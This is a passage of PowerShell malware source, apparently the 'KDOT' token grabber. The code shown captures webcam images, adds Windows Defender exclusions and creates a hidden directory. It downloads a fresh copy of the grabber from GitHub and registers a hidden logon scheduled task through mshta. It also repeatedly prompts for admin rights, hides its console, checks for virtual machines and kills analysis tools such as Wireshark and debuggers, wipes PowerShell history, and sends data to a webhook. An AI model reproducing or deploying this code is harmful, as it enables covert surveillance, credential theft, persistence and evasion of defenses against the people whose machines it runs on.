                for (short i = 0; i < 10; i++) 
                { 
                    if (capGetDriverDescriptionA(i, ref dName, 100, ref dVersion, 100)) 
                    { 
                        Device d = new Device(i); 
                        d.Name = dName.Trim(); 
                        d.Version = dVersion.Trim(); 
                        devices.Add(d);                     
                    } 
                } 
    
                return (Device[])devices.ToArray(typeof(Device)); 
            } 
    
            public static Device GetDevice(int deviceIndex) 
            { 
                return (Device)devices[deviceIndex]; 
            } 
        } 
    } 
"@ 
    Add-Type -AssemblyName System.Drawing  
    $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() |   
    Where-Object { $_.FormatDescription -eq "JPEG" }       
    Add-Type -TypeDefinition $source -ReferencedAssemblies System.Windows.Forms, System.Data, System.Drawing  | Out-Null
    try {
        #region Import the Assemblies 
        [reflection.assembly]::loadwithpartialname("System.Windows.Forms") | Out-Null 
        [reflection.assembly]::loadwithpartialname("System.Drawing") | Out-Null 
        #endregion 
        $picCapture = New-Object System.Windows.Forms.PictureBox 
        try {
            $devices = [WebCamLib.DeviceManager]::GetAllDevices()
        } catch {
            Write-Host "No camera found"
            exit
        }
        $count = 0
        foreach ($device in $devices) {
            $imagePath = "$env:localappdata\temp\out$count.jpg"
            $device.ShowWindow($picCapture)
            $device.CopyC()
            $bitmap = [Windows.Forms.Clipboard]::GetImage()
            $bitmap.Save($imagePath, $jpegCodec, $ep)
            $bitmap.dispose()
            $count++
            [Windows.Forms.Clipboard]::Clear()
        }

    } catch {
            Write-Host "No camera found"
            exit
        }
}

$webhook = "YOUR_WEBHOOK_HERE"

function Invoke-TASKS {
    Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
    Add-MpPreference -ExclusionPath "$env:APPDATA\KDOT"
    New-Item -ItemType Directory -Path "$env:APPDATA\KDOT" -Force
    # Hidden Directory
    $KDOT_DIR=get-item "$env:APPDATA\KDOT" -Force
    $KDOT_DIR.attributes="Hidden","System" 
    #$origin = $PSCommandPath
    #Copy-Item -Path $origin -Destination "$env:APPDATA\KDOT\KDOT.ps1" -Force
    #download new grabber
    (New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/main.ps1", "$env:APPDATA\KDOT\KDOT.ps1")
    #replace YOUR_WEBHOOK_HERE with the webhook
    $inputstuff = Get-Content "$env:APPDATA\KDOT\KDOT.ps1"
    #IM USING [CHAR]89 TO REPLACE THE Y SO THE BUILDER DOESN'T REPLACE IT
    $to_replace = [char]89 + "OUR_WEBHOOK_HERE"
    $inputstuff = $inputstuff -replace "$to_replace", "$webhook"
    $inputstuff | Set-Content "$env:APPDATA\KDOT\KDOT.ps1" -Force
    $task_name = "KDOT"
    $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument 'vbscript:createobject("wscript.shell").run("PowerShell.exe -ExecutionPolicy Bypass -File %appdata%\kdot\kdot.ps1",0)(window.close)'
    $task_trigger = New-ScheduledTaskTrigger -AtLogOn
    $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
    Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "KDOT" -RunLevel Highest -Force
    EXFILTRATE-DATA
}

function Request-Admin {
    while(!(CHECK_IF_ADMIN)) {
        try {
            Start-Process "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle hidden -File `"$PSCommandPath`"" -Verb RunAs
            exit
        }
        catch {}
    }
}

function Invoke-ANTITOTAL {
    $urls = @(
        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt",
        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt",
        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt",
        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt"
    )
    $functions = @(
        "Search-Mac",
        "Search-IP",
        "Search-HWID",
        "Search-Username"
    )
    
    for ($i = 0; $i -lt $urls.Count; $i++) {
        $url = $urls[$i]
        $functionName = $functions[$i]
        
        $result = Invoke-WebRequest -Uri $url -Method Get
        if ($result.StatusCode -eq 200) {
            $content = $result.Content
            $function = Get-Command -Name $functionName
            $output = & $function.Name $content
            
            if ($output -eq $true) {
                Write-Host "Closing the app..."
                exit
            }
        }
        else {
            Write-Host "Failed to retrieve content from URL: $url"
            exit
        }
    }
    Invoke-ANTIVM
}

function Search-Mac ($mac_addresses) {
    $pc_mac = (Get-WmiObject win32_networkadapterconfiguration -ComputerName $env:COMPUTERNAME | Where{$_.IpEnabled -Match "True"} | Select-Object -Expand macaddress) -join ","
    ForEach ($mac123 in $mac_addresses) {
        if ($pc_mac -contains $mac123) {
            return $true
        }
    }
    return $false
}

function Search-IP ($ip_addresses) {
    $pc_ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing
    $pc_ip = $pc_ip.Content
    ForEach ($ip123 in $ip_addresses) {
        if ($pc_ip -contains $ip123) {
            return $true
        }
    }
    return $false
}

function Search-HWID ($hwids) {
    $pc_hwid = Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID
    ForEach ($hwid123 in $hwids) {
        if ($pc_hwid -contains $hwid123) {
            return $true
        }
    }
    return $false
}

function Search-Username ($usernames) {
    $pc_username = $env:USERNAME
    ForEach ($username123 in $usernames) {
        if ($pc_username -contains $username123) {
            return $true
        }
    }
    return $false
}

function Invoke-ANTIVM {
    $processnames= @(
            "autoruns",
            "autorunsc",
            "dumpcap",
            "fiddler",
            "fakenet",
            "hookexplorer",
            "immunitydebugger",
            "httpdebugger",
            "importrec",
            "lordpe",
            "petools",
            "processhacker",
            "resourcehacker",
            "scylla_x64",
            "sandman",
            "sysinspector",
            "tcpview",
            "die",
            "dumpcap",
            "filemon",
            "idaq",
            "idaq64",
            "joeboxcontrol",
            "joeboxserver",
            "ollydbg",
            "proc_analyzer",
            "procexp",
            "procmon",
            "pestudio",
            "qemu-ga",
            "qga",
            "regmon",
            "sniff_hit",
            "sysanalyzer",
            "tcpview",
            "windbg",
            "wireshark",
            "x32dbg",
            "x64dbg",
            "vmwareuser",
            "vmacthlp",
            "vboxservice",
            "vboxtray",
            "xenservice"
        )
    $detectedProcesses = $processnames | ForEach-Object {
        $processName = $_
        if (Get-Process -Name $processName) {
            $processName
        }
    }

    if ($null -eq $detectedProcesses) { 
        Invoke-TASKS
    }
    else { 
        Write-Output "Detected processes: $($detectedProcesses -join ', ')"
        Foreach ($process in $detectedProcesses) {
            Stop-Process -Name $process -Force
        }
    }
}

function Hide-Console
{
    if (-not ("Console.Window" -as [type])) { 
        Add-Type -Name Window -Namespace Console -MemberDefinition '
        [DllImport("Kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
        '
    }
    $consolePtr = [Console.Window]::GetConsoleWindow()
    $null = [Console.Window]::ShowWindow($consolePtr, 0)
}

if (CHECK_IF_ADMIN -eq $true) {
    Hide-Console
    MUTEX-CHECK
    # Self-Destruct
    # Remove-Item $PSCommandPath -Force 
} else {
    Write-Host ("Please run as admin!") -ForegroundColor Red
    Start-Sleep -s 1
    Request-Admin
}

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Added Digital Signature 

# SIG # Begin signature block
# MIIWogYJKoZIhvcNAQcCoIIWkzCCFo8CAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB
# gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR
# AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQU18jUI1DxUYDCpDjXQT46ND1Q
# 73egghDvMIIDAjCCAeqgAwIBAgIQEWMmoKo9C7lEjE9tBvi5HTANBgkqhkiG9w0B
# AQsFADAZMRcwFQYDVQQDDA5Hb2RGYXRoZXIgSW5jLjAeFw0yMzA1MjQwMjU4Mzda
# Fw0zMzA1MjQwMzA4MzdaMBkxFzAVBgNVBAMMDkdvZEZhdGhlciBJbmMuMIIBIjAN
# BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA04fnopwqh2YOsqoRzSP98c0EDzjf
# MG3UsNu2IsLaG+HE1vP8IPV2hzvV2IyDerjxw9qbKNRDW1OZZCLtizucNvkiyCQ/
# ii1dRp5aIQghnyMln0Kv3lrmP4nKyJVfUi7v7cshaPaNT/uz4sHH9glCQqLeimXj
# ovS2wpd64p7TyK2ysHzkSoRjML0AzuX4Z7uxItGScu5ySnlvVbKx16gdxYUX6auK
# OrEE3RkgoH1GaaUxAm/kzYBYzpD7o1sxHcuPEbFf+t88ffgEX0nhNkXLfL8fhTxq
# zJUnfk7tEKDVnHjTW4IWEPLdTBCZt/jrH5J4XbMBDlUs7t75EsERTJvEFQIDAQAB
# o0YwRDAOBgNVHQ8BAf8EBAMCB4AwEwYDVR0lBAwwCgYIKwYBBQUHAwMwHQYDVR0O
# BBYEFNldflUoPDlfnf4CW+ny0shnHVrgMA0GCSqGSIb3DQEBCwUAA4IBAQAWVKQS
# UB+QQNTkLYQMh1RiVASm9afQlJ8sqTIrEXGJ2nKFSAq77SmwOshjRNs2vtHED3WV
# RHzlZcE20pyev00n8rdoBz0E/PkxOKFFYOnswWw5tuCip1ESl/Qjt/5ohGtfhWX1
# 1dVKOixDkPS4lwIaSnR+3D2cxhpG9NZYtRPXmGVwep43QqEeTok2OeReJPpkhQAP
# LCaNT0zQAzK9RUMlZlIR0OmUKGIiYu3A7YmJXt9kLWcZOwTkb1Sn2kF90Kp15zVy
# GOZWf+BEr/G2jFESDF5ccISNaMZN8pOSE7KtU+0hbvksVdySiWHtT5oStnhVXGng
# hvnJE3yLTyxXuXtqMIIG7DCCBNSgAwIBAgIQMA9vrN1mmHR8qUY2p3gtuTANBgkq
# hkiG9w0BAQwFADCBiDELMAkGA1UEBhMCVVMxEzARBgNVBAgTCk5ldyBKZXJzZXkx
# FDASBgNVBAcTC0plcnNleSBDaXR5MR4wHAYDVQQKExVUaGUgVVNFUlRSVVNUIE5l
# dHdvcmsxLjAsBgNVBAMTJVVTRVJUcnVzdCBSU0EgQ2VydGlmaWNhdGlvbiBBdXRo
# b3JpdHkwHhcNMTkwNTAyMDAwMDAwWhcNMzgwMTE4MjM1OTU5WjB9MQswCQYDVQQG
# EwJHQjEbMBkGA1UECBMSR3JlYXRlciBNYW5jaGVzdGVyMRAwDgYDVQQHEwdTYWxm
# b3JkMRgwFgYDVQQKEw9TZWN0aWdvIExpbWl0ZWQxJTAjBgNVBAMTHFNlY3RpZ28g
# UlNBIFRpbWUgU3RhbXBpbmcgQ0EwggIiMA0GCSqGSIb3DQEBAQUAA4ICDwAwggIK
# AoICAQDIGwGv2Sx+iJl9AZg/IJC9nIAhVJO5z6A+U++zWsB21hoEpc5Hg7XrxMxJ
# NMvzRWW5+adkFiYJ+9UyUnkuyWPCE5u2hj8BBZJmbyGr1XEQeYf0RirNxFrJ29dd
# SU1yVg/cyeNTmDoqHvzOWEnTv/M5u7mkI0Ks0BXDf56iXNc48RaycNOjxN+zxXKs
# Lgp3/A2UUrf8H5VzJD0BKLwPDU+zkQGObp0ndVXRFzs0IXuXAZSvf4DP0REKV4TJ
# f1bgvUacgr6Unb+0ILBgfrhN9Q0/29DqhYyKVnHRLZRMyIw80xSinL0m/9NTIMdg
# aZtYClT0Bef9Maz5yIUXx7gpGaQpL0bj3duRX58/Nj4OMGcrRrc1r5a+2kxgzKi7
# nw0U1BjEMJh0giHPYla1IXMSHv2qyghYh3ekFesZVf/QOVQtJu5FGjpvzdeE8Nfw
# KMVPZIMC1Pvi3vG8Aij0bdonigbSlofe6GsO8Ft96XZpkyAcSpcsdxkrk5WYnJee
# 647BeFbGRCXfBhKaBi2fA179g6JTZ8qx+o2hZMmIklnLqEbAyfKm/31X2xJ2+opB
# JNQb/HKlFKLUrUMcpEmLQTkUAx4p+hulIq6lw02C0I3aa7fb9xhAV3PwcaP7Sn1F
# NsH3jYL6uckNU4B9+rY5WDLvbxhQiddPnTO9GrWdod6VQXqngwIDAQABo4IBWjCC
# AVYwHwYDVR0jBBgwFoAUU3m/WqorSs9UgOHYm8Cd8rIDZsswHQYDVR0OBBYEFBqh
# +GEZIA/DQXdFKI7RNV8GEgRVMA4GA1UdDwEB/wQEAwIBhjASBgNVHRMBAf8ECDAG
# AQH/AgEAMBMGA1UdJQQMMAoGCCsGAQUFBwMIMBEGA1UdIAQKMAgwBgYEVR0gADBQ
# BgNVHR8ESTBHMEWgQ6BBhj9odHRwOi8vY3JsLnVzZXJ0cnVzdC5jb20vVVNFUlRy
# dXN0UlNBQ2VydGlmaWNhdGlvbkF1dGhvcml0eS5jcmwwdgYIKwYBBQUHAQEEajBo
# MD8GCCsGAQUFBzAChjNodHRwOi8vY3J0LnVzZXJ0cnVzdC5jb20vVVNFUlRydXN0
# UlNBQWRkVHJ1c3RDQS5jcnQwJQYIKwYBBQUHMAGGGWh0dHA6Ly9vY3NwLnVzZXJ0
# cnVzdC5jb20wDQYJKoZIhvcNAQEMBQADggIBAG1UgaUzXRbhtVOBkXXfA3oyCy0l
# hBGysNsqfSoF9bw7J/RaoLlJWZApbGHLtVDb4n35nwDvQMOt0+LkVvlYQc/xQuUQ
# ff+wdB+PxlwJ+TNe6qAcJlhc87QRD9XVw+K81Vh4v0h24URnbY+wQxAPjeT5OGK/
# EwHFhaNMxcyyUzCVpNb0llYIuM1cfwGWvnJSajtCN3wWeDmTk5SbsdyybUFtZ83J
# b5A9f0VywRsj1sJVhGbks8VmBvbz1kteraMrQoohkv6ob1olcGKBc2NeoLvY3NdK
# 0z2vgwY4Eh0khy3k/ALWPncEvAQ2ted3y5wujSMYuaPCRx3wXdahc1cFaJqnyTdl
# Hb7qvNhCg0MFpYumCf/RoZSmTqo9CfUFbLfSZFrYKiLCS53xOV5M3kg9mzSWmglf
# jv33sVKRzj+J9hyhtal1H3G/W0NdZT1QgW6r8NDT/LKzH7aZlib0PHmLXGTMze4n
# muWgwAxyh8FuTVrTHurwROYybxzrF06Uw3hlIDsPQaof6aFBnf6xuKBlKjTg3qj5
# PObBMLvAoGMs/FwWAKjQxH/qEZ0eBsambTJdtDgJK0kHqv3sMNrxpy/Pt/360KOE
# 2See+wFmd7lWEOEgbsausfm2usg1XTN2jvF8IAwqd661ogKGuinutFoAsYyr4/kK
# yVRd1LlqdJ69SK6YMIIG9TCCBN2gAwIBAgIQOUwl4XygbSeoZeI72R0i1DANBgkq
# hkiG9w0BAQwFADB9MQswCQYDVQQGEwJHQjEbMBkGA1UECBMSR3JlYXRlciBNYW5j
# aGVzdGVyMRAwDgYDVQQHEwdTYWxmb3JkMRgwFgYDVQQKEw9TZWN0aWdvIExpbWl0
# ZWQxJTAjBgNVBAMTHFNlY3RpZ28gUlNBIFRpbWUgU3RhbXBpbmcgQ0EwHhcNMjMw
# NTAzMDAwMDAwWhcNMzQwODAyMjM1OTU5WjBqMQswCQYDVQQGEwJHQjETMBEGA1UE
# CBMKTWFuY2hlc3RlcjEYMBYGA1UEChMPU2VjdGlnbyBMaW1pdGVkMSwwKgYDVQQD
# DCNTZWN0aWdvIFJTQSBUaW1lIFN0YW1waW5nIFNpZ25lciAjNDCCAiIwDQYJKoZI
# hvcNAQEBBQADggIPADCCAgoCggIBAKSTKFJLzyeHdqQpHJk4wOcO1NEc7GjLAWTk
# is13sHFlgryf/Iu7u5WY+yURjlqICWYRFFiyuiJb5vYy8V0twHqiDuDgVmTtoeWB
# IHIgZEFsx8MI+vN9Xe8hmsJ+1yzDuhGYHvzTIAhCs1+/f4hYMqsws9iMepZKGRNc
# rPznq+kcFi6wsDiVSs+FUKtnAyWhuzjpD2+pWpqRKBM1uR/zPeEkyGuxmegN77tN
# 5T2MVAOR0Pwtz1UzOHoJHAfRIuBjhqe+/dKDcxIUm5pMCUa9NLzhS1B7cuBb/Rm7
# HzxqGXtuuy1EKr48TMysigSTxleGoHM2K4GX+hubfoiH2FJ5if5udzfXu1Cf+hgl
# TxPyXnypsSBaKaujQod34PRMAkjdWKVTpqOg7RmWZRUpxe0zMCXmloOBmvZgZpBY
# B4DNQnWs+7SR0MXdAUBqtqgQ7vaNereeda/TpUsYoQyfV7BeJUeRdM11EtGcb+Re
# DZvsdSbu/tP1ki9ShejaRFEqoswAyodmQ6MbAO+itZadYq0nC/IbSsnDlEI3iCCE
# qIeuw7ojcnv4VO/4ayewhfWnQ4XYKzl021p3AtGk+vXNnD3MH65R0Hts2B0tEUJT
# cXTC5TWqLVIS2SXP8NPQkUMS1zJ9mGzjd0HI/x8kVO9urcY+VXvxXIc6ZPFgSwVP
# 77kv7AkTAgMBAAGjggGCMIIBfjAfBgNVHSMEGDAWgBQaofhhGSAPw0F3RSiO0TVf
# BhIEVTAdBgNVHQ4EFgQUAw8xyJEqk71j89FdTaQ0D9KVARgwDgYDVR0PAQH/BAQD
# AgbAMAwGA1UdEwEB/wQCMAAwFgYDVR0lAQH/BAwwCgYIKwYBBQUHAwgwSgYDVR0g
# BEMwQTA1BgwrBgEEAbIxAQIBAwgwJTAjBggrBgEFBQcCARYXaHR0cHM6Ly9zZWN0
# aWdvLmNvbS9DUFMwCAYGZ4EMAQQCMEQGA1UdHwQ9MDswOaA3oDWGM2h0dHA6Ly9j
# cmwuc2VjdGlnby5jb20vU2VjdGlnb1JTQVRpbWVTdGFtcGluZ0NBLmNybDB0Bggr
# BgEFBQcBAQRoMGYwPwYIKwYBBQUHMAKGM2h0dHA6Ly9jcnQuc2VjdGlnby5jb20v
# U2VjdGlnb1JTQVRpbWVTdGFtcGluZ0NBLmNydDAjBggrBgEFBQcwAYYXaHR0cDov
# L29jc3Auc2VjdGlnby5jb20wDQYJKoZIhvcNAQEMBQADggIBAEybZVj64HnP7xXD
# Mm3eM5Hrd1ji673LSjx13n6UbcMixwSV32VpYRMM9gye9YkgXsGHxwMkysel8Cbf
# +PgxZQ3g621RV6aMhFIIRhwqwt7y2opF87739i7Efu347Wi/elZI6WHlmjl3vL66
# kWSIdf9dhRY0J9Ipy//tLdr/vpMM7G2iDczD8W69IZEaIwBSrZfUYngqhHmo1z2s
# IY9wwyR5OpfxDaOjW1PYqwC6WPs1gE9fKHFsGV7Cg3KQruDG2PKZ++q0kmV8B3w1
# RB2tWBhrYvvebMQKqWzTIUZw3C+NdUwjwkHQepY7w0vdzZImdHZcN6CaJJ5OX07T
# jw/lE09ZRGVLQ2TPSPhnZ7lNv8wNsTow0KE9SK16ZeTs3+AB8LMqSjmswaT5qX01
# 0DJAoLEZKhghssh9BXEaSyc2quCYHIN158d+S4RDzUP7kJd2KhKsQMFwW5kKQPqA
# bZRhe8huuchnZyRcUI0BIN4H9wHU+C4RzZ2D5fjKJRxEPSflsIZHKgsbhHZ9e2hP
# jbf3E7TtoC3ucw/ZELqdmSx813UfjxDElOZ+JOWVSoiMJ9aFZh35rmR2kehI/shV
# Cu0pwx/eOKbAFPsyPfipg2I2yMO+AIccq/pKQhyJA9z1XHxw2V14Tu6fXiDmCWp8
# KwijSPUV/ARP380hHHrl9Y4a1LlAMYIFHTCCBRkCAQEwLTAZMRcwFQYDVQQDDA5H
# b2RGYXRoZXIgSW5jLgIQEWMmoKo9C7lEjE9tBvi5HTAJBgUrDgMCGgUAoHgwGAYK
# KwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkqhkiG9w0BCQMxDAYKKwYBBAGCNwIB
# BDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGCNwIBFTAjBgkqhkiG9w0BCQQxFgQU
# cNm7nbCFPo+PopXASIQbZp/EqeYwDQYJKoZIhvcNAQEBBQAEggEAKdZU0fgLPapk
# IQVgIycMuVriX44T+oXQa+DnGiz/uVM0NXBeQzJ3GPFauBT7pHKaUo9J4lxgl5ev
# SrT7md5T+x5yYzjwaqVIUqnPaPSvbmjJrdvrJvdB5ZF6z64xfFPBimJoWj3tlXsT
# Lc7RY9ElQsa6oL00oizC9DEChDygJJ8oVsq+wph9Q33dltISh10jCfUWUEizxK8+
# Oy8dM0Zm0rsBaUe/0GgzXlDv3SkOUTtNCCW9247bOPzMoYrv7VTL6MA4lwYHWBXd
# Hn8nhUYozLXqWXY8FfOOO+ETiJaYfFcn/3fzcI9uuHioUiniT0OeDyPllqhxWjHC
# 0+sQqtOCTKGCA0swggNHBgkqhkiG9w0BCQYxggM4MIIDNAIBATCBkTB9MQswCQYD
# VQQGEwJHQjEbMBkGA1UECBMSR3JlYXRlciBNYW5jaGVzdGVyMRAwDgYDVQQHEwdT
# YWxmb3JkMRgwFgYDVQQKEw9TZWN0aWdvIExpbWl0ZWQxJTAjBgNVBAMTHFNlY3Rp
# Z28gUlNBIFRpbWUgU3RhbXBpbmcgQ0ECEDlMJeF8oG0nqGXiO9kdItQwDQYJYIZI
# AWUDBAICBQCgeTAYBgkqhkiG9w0BCQMxCwYJKoZIhvcNAQcBMBwGCSqGSIb3DQEJ
# BTEPFw0yMzA1MjQwMzA4NTZaMD8GCSqGSIb3DQEJBDEyBDCoIcmbAQSkccGsv68r
# jJUfEndBO1Vn/niFM9e0m4rF85TMonCWcFpYLnzJTYPSk6YwDQYJKoZIhvcNAQEB
# BQAEggIAjJdXklaXaQ33eQz/lfQCJUB0OU+3B/au3/UYea2RFhEGfCbKRoYt1uAn
# ptDdvPPN6LkzY8uEdENoe17aXiVOlscKD89wuq8EAKg+grmw/whwe0Tv5HGwP6bQ
# ZOP9TaK+cSwU95ocxLPsDAcly07BbmoaDef+SCvD9eJxHwz2mAU6W7KaNteIndaY
# 8igRjnq1DsbO2n4OcT+uQRzi+v33yw+MZvdoYCpLRAyQ0o69cOtWkkEz/36+nK5L
# exnx/C/8ybvNHENZgrKSZDTFsaR9XLV0rLygb17YMurwQHdZroyHqKPD5fD/ddox
# FTPST5EczJsz8h2d0LLM4bHZNS7u0Q8bkBq7ILbsqXb7tWaow1CdPVLkZHzfLVrZ
# hA07qU6+uQdXUX7HqRAs/NosxMffVzQodnLmrZirUV4VmcIq4o7UVxDhAOI5ZqYg
# 9H4LITnnfv6AtabWyuXIol8eIeE0Gp6xrgzvhWeyakUbBLDd9XEPoJIWQUAXmi4A
# 7h1oxYvsL3MjzicqswGC87CbgKmuFNTSr1F0ujwMleIZlrWHR9jmcKcq6Dh32KLJ
# /d1aUVbobDOqQKTlEAHtxXMWG0+X2o4lFfuGAHCCaMI7+iEb4e8O7i2aoUk1Fxy8
# tz7P29qBnor859PuPbCAef3jdrHkOAFs3LKbcpQJ6jUpGdswthQ=
# SIG 
# End signature block
